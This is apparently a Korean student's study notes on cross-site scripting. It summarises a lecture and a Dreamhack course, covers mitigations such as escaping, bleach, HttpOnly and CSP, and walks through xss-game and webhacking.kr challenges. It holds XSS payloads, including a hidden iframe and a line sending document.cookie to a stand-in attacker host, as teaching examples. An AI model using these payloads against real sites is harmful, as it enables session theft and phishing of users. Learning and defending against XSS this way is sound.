출처 : https://www.youtube.com/watch?v=DoN7bkdQBXU

<h1>XSS youtube 강의 요약</h1>
<h3>XSS : Cross Site Scripting</h3>
<p>특정한 script를 삽입하는 공격이다.</p>
<p>web은 CSS, JS와 같이 다양한 컨텐츠들을 구성함으로써 동적이고 화려한 웹페이지를 구성하는 것이 일반적인데, 이 중 가장 대표적인 것 그리고 또 기능적으로나 가장 중요한 것이 Javascript부분은 XSS 공격의 대상이다.</p>
<p>Javascript 의 시스템 취야점을 이용해서 특정 웹사이트에 어떤 scripting 구문을 삽입해서 자신의 이익을 취하거나 해당 시스템을 마비시키거나 각종 정보를 수집하거나 하는 공격 기법이 바로 XSS(Cross Site Scripting)</p>

XSS는 다양한 방법으로 공격이 가능하다.

```html
<script>
    alert("XSS 공격!");
</script>
```

```html
<a href="javascript:alert('XSS')">XSS</a>
```

```html
<img src="#" onerror="alert('XSS 공격!');">
```


아스키코드를 이용하여 공격할 수도 있다.

![image](https://user-images.githubusercontent.com/62539341/82067066-2d613080-970b-11ea-8294-371bd482959f.png)

이 변환된 아스키코드를 웹 html에 맞는 형태로 만들어

![image](https://user-images.githubusercontent.com/62539341/82067251-6b5e5480-970b-11ea-99e5-5cac16aaea97.png)

XSS 공격이 실행된다. 이 방법은 필터링이 조금 더 어려워 비교적 더 강력한 XSS 공격이라고 할 수 있다.

이제 조금 더 응용해보자.

```html
<IFRAME ID = "showFRame" SRC="javascript:document.write('><script>
alert(3);
function show(){
    alert(5);
}
alert(4);
</script>
');" width="0" height="0" frameborder="0"></IFRAME>
<button id="button" onClice='document.getElementById("showFrame").contentWindow.show()'>버튼</button>
```

크기가 0이기 때문에 우리 눈엔 보이지 않지만 실행이 되는 해킹 공격이다.<br>

출처 : https://dreamhack.io/learn/1
<h1>XSS 관련 드림핵 강좌 & 실습</h1>
<h3>Cross Site Scripting</h3>

<p>서버의 응답에 공격자가 삽입된 악성 스크립트를 받은 사용자의 웹 브라우저에서 악성 스크립트가 실행되는 취약점을 Cross Site Scripting (XSS)라고 한다.</p>

XSS 공격을 성공적으로 수행하기 위해서 필요한 2가지 조건

1. <b>입력 데이터에 대한 충분한 검증 과정이 없어야 한다.</b>
    - 입력한 데이터가 충분한 검증 과정이 이루어지지 않아 악성 스크립트가 삽입될 수 있어야 한다.
2. <b>서버의 응답 데이터가 웹 브라우저 내 페이지에 출력 시 충분한 검증 과정이 없어야 한다.</b>
    - 응답 데이터 출력 시 악성 스크립트가 웹 브라우저의 렌더링 과정에 악성 스크립트는 브라우저가 실행할 수 있는 웹 리소스를 말하며, 대표적으로 HTML, JS 등이 있다.

![image](https://user-images.githubusercontent.com/62539341/82070219-63a0af00-970f-11ea-9858-cf213c90d36e.png)

>XSS 취약점에 대한 정보를 공유할 때 alert 또는 prompt와 같은 메시지 창을 실행하는 이유는 XSS 취약점이 발생하였다는 점을 시각적으로 표현이 가능하기 때문입니다. 주로 메시지 창에는 해당 페이지의 domain을 확인하기 위해 document.domain을 인자로 줍니다.

<h3>XSS with Javascript</h3>
<p>Javascript(자바스크립트)는 사용자의 웹 브라우저에서 화면을 동적으로 보여줄 수 있도록 자동으로 버튼을 누르거나 화면 구성을 바꾸는 등의 작업을 할 때 많이 사용된다. 이러한 UI적인 측면 외에도 사용자와의 상호작용 없이 사용자의 권한으로 정보를 조회하거나 변경하는 등의 요청을 주고 응답받는 것도 가능하다. 사용자의 권한을 가지고 있는 세션 쿠키는 사용자에게 저장되어있고 웹 브라우저는 해당 쿠키에 접근할 수 있기 때문이다.</p>
<p>이외에도 웹 브라우저에서 출력되어지는 페이지의 내용을 조작하거나, 웹 브라우저의 위치를 공격자가 원하는 주소로 변경 가능하다. 이처럼 사용자의 입장에서 발생하는 행위를 동작 시킬 수 있기 때문에 자바스크립트는 XSS 공격에 많이 사용된다.</p>
<p>자바스크립트를 실행하는 대표적인 방법은 script 태그를 이용하는 방식이 있다. 공격자가 입력 데이터로 script 태그를 전송 해 다른 사용자의 응답에 포함되면 공격자의 자바스크립트가 실행된다. script 태그 외에도 태그의 속성 중 특정 상황에서 발생하는 on* 이벤트들을 사용하여 자바스크립트 실행이 가능.</p>

```html
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

```html
<script>
// 사용자의 페이지 정보에 접근.
document;
// 사용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

```html
<script>
// 사용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

<h3>Stored XSS</h3>
<p>Stored XSS는 악성 스크립트가 서버 내에 존재하는 데이터베이스 또는 파일 등의 형태로 저장되어 있다가 사용자가 저장된 악성 스크립트를 조회하는 순간 발생하는 형태의 XSS. 대표적으로 게시판 서비스에서 작성된 게시물을 확인하는 과정에서 악성 스크립트가 포함된 게시물을 조회할 때 악성 스크립트가 실행되는 공격 방식이 있다.</p>

<p>
서비스의 형태와 접근성, 그리고 해당 서비스를 통해 얻을 수 있는 정보 또는 행위들에 따라 파급력은 달라질 수 있다.</p>

<h3>Reflected XSS</h3>
<p>Reflected XSS는 악성 스크립트가 사용자의 요청 시 전송되는 형태. 사용자의 요청 데이터가 서버의 응답에 포함되는 과정에서 HTML 등의 악성 스크립트가 그대로 출력되어 발생한다.</p>
<p>
Reflected XSS는 Stored XSS와는 다르게 사용자의 요청 데이터에 의해 취약점이 발생하기 때문에, 변조된 데이터가 사용자의 요청으로 전송되는 형태를 유도해야 한다. 가장 간단한 방법으로는 특정 링크를 유도하는 방식이 존재하며 Click Jacking, Open Redirect 등의 다른 취약점과 연계하여 발생시키는 방법도 존재한다.</p>
<p>
대표적인 예시로는 게시판 서비스에서 작성된 게시물들을 조회하는 과정에서 조회하기 위해 입력한 데이터에 의해 발생하는 방식이 있다. 사용자가 게시물 조회를 요청하면 서버는 해당 요청에 대하여 조회 한 결과를 응답에 출력하며, 편의성을 위해 사용자가 조회한 내용을 응답에 포함시키기도 한다. 이 때 웹브라우저에서 페이지를 출력 시 반영(Reflect)되는 결과로 인해 Reflected XSS로 이어질 수 있다.
</p>

<h3>Mitigations</h3>
<p>XSS는 웹 서비스상에서 빈번하게 일어나는 취약점 중 하나이며 이를 방어하는 많은 방법들이 존재한다.</p>
<p>
브라우저 단에서 방어하는 기술뿐만 아니라 서버 내부에 저장하는 시점 혹은 저장된 데이터를 꺼내와 출력하는 시점에 입력값을 올바르게 가공하는 방식으로 XSS를 방어해야 한다.
</p>

- Server-side Mitigations

- HTTPOnly 플래그 사용

- Content Security Policy 사용

- X-XSS-Protection

<h3>Server-side Mitigations</h3>
<p>XSS를 유발할 수 있는 태그 삽입을 방지하기 위해 서버 단에서 검증하는 방법
</p>
<p>
사용자 인풋이 HTML 형태를 지원할 필요가 없어 HTML 태그가 입력될 일이 없다면 꺽쇠 (<, >), 따옴표(", ')와 같은 특수 문자를 HTML Entity Encoding을 이용해 태그로써 인식이 안되도록 한다.
</p>
<p>
만약 사용자 인풋에 HTML 형태를 지원해야 한다면 화이트리스트 필터링을 해야한다.<br>
화이트리스트 필터링이란 허용해도 안전한 일부 태그, 속성을 제외한 모든 값을 필터링, 게시글을 운영하는데 있어서 img, video, a 태그만 필요하다면 해당되는 세 개의 태그를 제외한 모든 태그는 필터링 시키는 방식
</p>

사용자 인풋을 필터링 할 때 유의할 점은 요청의 URI Query 값이나 POST Body 값만 필터링 할 것이 아니라 User-Agent, Referer와 같은 헤더도 모두 포함하여 사용자로부터 온 값에 모두 적용해야 한다.

Mozilla 에서 제작한 Bleach (https://github.com/mozilla/bleach) 라는 HTML 필터링 라이브러리를 추천

그 외에도 사용자가 로그인할 때 세션에 로그인한 IP주소를 함께 저장하고, 사용자가 페이지를 접속할 때마다 현재 IP주소와 로그인 했던 IP주소가 동일한지 여부를 확인하는 방법이 있다. 이 방법은 공격자가 세션 ID를 탈취해도 희생자와 IP주소가 달라 희생자의 세션을 사용하지 못하게 하는 장점이 있어 과거에 널리 쓰였다. 최근에는 Mobile 환경의 사용자가 점점 많아지면서 접속한 WiFi가 바뀔 때마다 사용자의 IP주소가 함께 바뀌는 문제점 때문에 접속한 IP가 아닌 접속한 국가가 변경된 경우를 탐지하는 형태로 바뀌었다.

```py
# HTML Entity Encoding 예시
from jinja2 import utils
@app.route('/board/', methods=['GET', 'POST'])
def write():
    ...
    if request.method == 'POST':
        title = utils.escape(request.form.get('title'))
        content = utils.escape(request.form.get('content'))
        query = '...' % (...)
        ...
        return result
# 화이트리스트 필터링 예시
import bleach # https://github.com/mozilla/bleach
@app.route('/board/', methods=['GET', 'POST'])
def write():
    ...
    if request.method == 'POST':
        ALLOW_TAGS = ['a', 'p', 'h1', 'h2', 'h3']
        ALLOW_ATTRS = ['href']
        title = bleach.clean(request.form.get('title'), ALLOW_TAGS, ALLOW_ATTRS)
        content = bleach.clean(request.form.get('content'), ALLOW_TAGS, ALLOW_ATTRS)
        query = '...' % (...)
        ...
        return result
```
<h3>HTTPOnlyl Flag</h3>

```
Set-Cookie: session=sbdh1vjwvq; HttpOnly
```

HTTPOnly 플래그는 서버 측에서 응답 헤더에 Set-Cookie 헤더를 전송해 쿠키를 생성할 때 옵션으로 설정 가능하며 자바스크립트에서 해당 쿠키에 접근 하는 것을 금지한다. 이를 활용하면 XSS 취약점이 발생하더라도 공격자가 알아낼 수 없는 쿠키 값이기 때문에 세션쿠키를 설정할 땐 HTTPOnly 플래그를 설정하는 것을 추천!

<h3>Content Security Policy (CSP)</h3>

CSP는 응답 헤더나 meta 태그를 통해 아래와 같이 선언해서 사용할 수 있고, 각각의 지시어를 적용하여 사이트에서 로드하는 리소스들의 출처를 제한할 수 있다.

```html
Content-Security-Policy: <지시어>; ...
```

예를 들어 default-src 'self' *.dreamhack.io와 같이 설정된 CSP는 모든 리소스(이미지 파일, 스크립트 파일 등)의 출처가 현재 도메인이거나, *.dreamhack.io도메인이 출처일 경우만 허용한다. 또 script-src를 선언해 자바스크립트 코드의 출처를 제한할 수 있으며, 공격자가 외부에 업로드된 자바스크립트 파일을 호출하거나 직접 자바스크립트 코드를 작성하는 등의 행동을 막을 수 있다. 신뢰할 출처를 선언하는 방식이니만큼 신뢰받는 CDN 서버가 해킹당하면 무력화되는 단점이 있다.

이 외에도 많은 리소스 형식 (이미지, 폰트, 오브젝트, ...) 의 출처를 제한할 수 있는 지시어들이 존재하며 script-src 'nonce-noncevalue13b739d8ea12' 와 같이 script-src를 이용해 nonce (랜덤) 값을 설정하고 HTML 태그를 이용해 자바스크립트를 실행할 때는 반드시 서버에서 생성된 nonce 값을 알아야만 실행될 수 있도록 할 수 있다.

즉, XSS 공격을 당하더라도 서버에서 매번 생성되는 nonce 값을 유추할 수 없다면 일반적인 방법으로 자바스크립트 실행이 불가능해진다.

또한 script-src 'sha256-hashvalue_base64' 와 같은 형태로 자바스크립트나 스타일시트의 해시를 구해 CSP를 설정해주면 미리 구해둔 해시와 다를 경우 실행하지 않도록 할 수 있다.

```html
<!doctype html>
<html>
    <head>
        <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='">
    </head>
    <body>
    <script>alert(1);</script>
    </body>
</html>
```

위 코드는 script 태그 안의 자바스크립트 코드의 해시를 미리 구해 CSP 를 설정해 alert(1)을 성공적으로 호출할 수 있도록 한 예시이다.

<h3>X-XSS-Protection Header</h3>
X-XSS-Protection은 Response Header에 아래와 같이 선언해서 사용할 수 있다.

```js
X-XSS-Protection: <값>
```

해당 정책은 웹 브라우저에 내장된 XSS Filter를 활성화할 것인지를 설정한다. XSS Filter는 웹 브라우저에서 전송된 Request 값이 XSS 공격 코드와 유사하게 생겼고, Response에 해당 공격 코드가 포함되었을 경우에 XSS 공격이 수행되었다고 판단하여 XSS 공격이 발생했음을 유저에게 알리고 차단한다. Reflected XSS 공격을 막는 데에 적합한 방어 방법.

```js
X-XSS-Protection: 0
X-XSS-Protection: 1
X-XSS-Protection: 1; mode=block
X-XSS-Protection: 1; report=<reporting-uri>
```

해당 Header를 선언하지 않았을 때의 브라우저 기본 값은 1로, 기본으로 작동한다. 0일 경우 XSS Filter를 사용하지 않으며, 1일 경우 XSS 공격이 감지되면 해당 부분만 제거한 뒤 페이지 결과를 화면에 출력한다. mode=block일 경우 XSS 공격이 감지되면 페이지 전체의 렌더링을 중단하고, report를 선언할 경우에 XSS 공격이 감지된 사실을 미리 설정된 주소에 신고하여 운영자가 대처하기 쉽게 할 수 있다.

![image](https://user-images.githubusercontent.com/62539341/82078353-f7787800-971b-11ea-830b-611499c295a6.png)

<h1>XSS 관련 문제</h1>

<h2>1) xssgame 1,2
https://xss-game.appspot.com/</h2>

<h3>Level 1</h3>

![image](https://user-images.githubusercontent.com/62539341/82110432-84055380-9779-11ea-96ce-bd319ba726b4.png)

![image](https://user-images.githubusercontent.com/62539341/82110472-caf34900-9779-11ea-9f34-6e9a05ae4315.png)

Javascript로 alert 창을 띄우면 다음 단계로 넘어간다고 적혀있습니다.

![image](https://user-images.githubusercontent.com/62539341/82110691-41dd1180-977b-11ea-99cd-7c6cd820ccae.png)

제 타깃입니다. 일단 아무거나 입력해보았습니다.

![image](https://user-images.githubusercontent.com/62539341/82110702-5e794980-977b-11ea-871a-24f60ea7193b.png)

GET 방식으로 query 값이 들어가나봅니다.

문제에서 alert를 띄워보라고 해서 맨 처음에 배운 기본적인 alert를 써서 GET 방식으로 보내봤더니

![image](https://user-images.githubusercontent.com/62539341/82110741-92546f00-977b-11ea-89a3-6d9380fc85e8.png)

아직 페이지 소스보기를 안해봤는데.. 문제가 풀렸습니다..!

<h3>Level 2</h3>

![image](https://user-images.githubusercontent.com/62539341/82110813-e8c1ad80-977b-11ea-882e-e76918f29bd7.png)

이번 문제도... alert() 를 팝업하라는군요.

![image](https://user-images.githubusercontent.com/62539341/82110843-068f1280-977c-11ea-8673-f2efa65dc1dd.png)

이번 문제의 타깃입니다. 어떤 내용을 입력해서 포스트하는 웹 페이지 같습니다.

이번엔 바로 프레임소스를 보도록 하겠습니다.

![image](https://user-images.githubusercontent.com/62539341/82111065-296df680-977d-11ea-92e2-7419b4d795e6.png)

POST 방식으로 입력받는군요..

![image](https://user-images.githubusercontent.com/62539341/82111096-78b42700-977d-11ea-9be7-247534d77e31.png)

아까처럼 입력하니 문제가 안풀립니다...

다른 방법을 써야겠군요

![image](https://user-images.githubusercontent.com/62539341/82111116-a305e480-977d-11ea-87e5-d41d70cd0a43.png)

이번엔 이렇게 한번 입력해봤더니 

![image](https://user-images.githubusercontent.com/62539341/82111124-b913a500-977d-11ea-9e3f-3ce7b1f00c85.png)

성공입니다!!

<h2>2) webhacking-kr old.23</h2>

![image](https://user-images.githubusercontent.com/62539341/82112191-a309e280-9785-11ea-8314-8e7ba330736c.png)

이번에도 저의 목표는 alert를 띄우는 것이네요.

![image](https://user-images.githubusercontent.com/62539341/82112204-c7fe5580-9785-11ea-8ab7-571140780249.png)

GET 방식으로 입력값을 받아오는군요.

![image](https://user-images.githubusercontent.com/62539341/82112372-3e4f8780-9787-11ea-9b2b-6364dff2a762.png)

![image](https://user-images.githubusercontent.com/62539341/82112530-99ce4500-9788-11ea-8538-31686d2a02f8.png)

아까 썼던 두 방법을 사용해봤는데 통하지 않습니다. 
(어떻게 하지..?)

강좌에서 사용자 인풋이 <,> 같은 게 들어올 필요가 없다면 thml 태그로 인식 안되도록 막는 방법으로 XSS를 막을 수 있다고 했다. 그러면 <,>를 직접 쓰지 않고 아스키코드로 변환해서 넣어보면 되지 않을까?

![image](https://user-images.githubusercontent.com/62539341/82132797-a43b1e00-981e-11ea-93a8-038fa064aeb5.png)

세 값 모두 넣어봤는데 경고창이 뜨지 않는다. 다시 한번 고민해봐야겠다...

계속 아무거나 입력해보다가 찾아낸 것은

![image](https://user-images.githubusercontent.com/62539341/82132889-e4e76700-981f-11ea-9cb1-94ac052f2619.png)

숫자를 입력하면 무리없이 잘 나온다.

![image](https://user-images.githubusercontent.com/62539341/82132901-05afbc80-9820-11ea-9831-d3373cdb807b.png)

이렇게 문자를 입력하니까 no hack이라고 뜬다. 그러면 문자를 다 막는 것인가?

![image](https://user-images.githubusercontent.com/62539341/82132912-29730280-9820-11ea-932b-703a0954ba51.png)

a와 b 사이에 물음표?를 넣으니까 잘 출력된다.

그러면 script alert 명령에 사이사이에 문자가 아닌 것을 넣으면 아마 잘 출력될 것이다. 그렇다고 숫자나 ? 같은거를 넣으면 명령이 제대로 실행안될 것이니 아까 사용하던 아스키코드에 NULL 를 넣으면 되지 않을까?

![image](https://user-images.githubusercontent.com/62539341/82133028-b5d1f500-9821-11ea-97e3-fb36af9b2191.png)

![image](https://user-images.githubusercontent.com/62539341/82133041-c1bdb700-9821-11ea-9982-8d6d13dd010e.png)

드디어 풀렸다!!! 마지막 문제가 제일 어려웠다..